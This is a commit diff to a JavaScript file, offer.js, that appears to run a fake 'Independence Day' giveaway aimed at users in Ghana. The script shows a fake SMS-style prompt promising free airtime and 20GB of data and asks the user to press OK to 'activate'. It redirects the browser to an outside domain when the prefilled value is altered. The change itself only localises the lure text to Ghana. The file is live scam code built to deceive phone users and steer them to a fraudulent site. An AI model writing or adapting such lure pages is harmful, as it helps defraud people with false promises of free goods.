f35769a4d5745b59ab95cc2d304906ac5eb2c7b4
essac5523me <essac5523+me@gmail.com>
2025-03-04 02:08:36 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '20GB + GH₵50 Airtime'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 20GB Free Data INDEPENDENCE DAY Offer, Kindly Press OK to ACTIVATE ','20GB + GH₵50 Airtime');
+password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 20GB Free Data GHANA INDEPENDENCE DAY Offer, Kindly Press OK to ACTIVATE ','20GB + GH₵50 Airtime');
 if (password != '20GB + GH₵50 Airtime') {
 location.href='https://gh-independence.4g-data.info/20GB';
 }
